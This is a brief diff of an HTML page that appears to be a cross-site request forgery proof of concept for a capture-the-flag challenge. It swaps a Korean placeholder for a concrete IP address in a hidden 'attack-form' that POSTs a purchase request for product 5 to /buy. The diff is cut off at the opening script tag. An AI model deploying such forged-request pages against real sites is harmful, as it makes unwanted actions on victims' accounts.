@@ -3,7 +3,7 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <form id="attack-form" action="http://[문제_서버_실제_주소]/buy" method="POST">
+    <form id="attack-form" action="http://15.164.98.47:32689/buy" method="POST">
         <input type="hidden" name="product_id" value="5">
     </form>
     <script>
